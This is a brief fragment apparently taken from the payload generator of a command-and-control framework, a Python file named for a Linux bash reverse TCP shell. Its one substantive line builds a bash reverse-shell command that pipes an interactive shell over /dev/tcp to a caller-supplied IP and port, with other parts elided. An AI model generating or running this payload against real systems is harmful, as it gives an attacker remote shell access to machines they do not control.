# Extracted from: C:\DEV\PyAgent\.external\0xSojalSec-GunnerC2\core\payload_generator\linux\tcp\bash_reverse_tcp.py
import base64
...
def make_raw(ip, port, use_ssl):
    if use_ssl:
        ...
        raw = f"bash -c '/bin/sh -i >& /dev/tcp/{ip}/{port} 0>&1'"
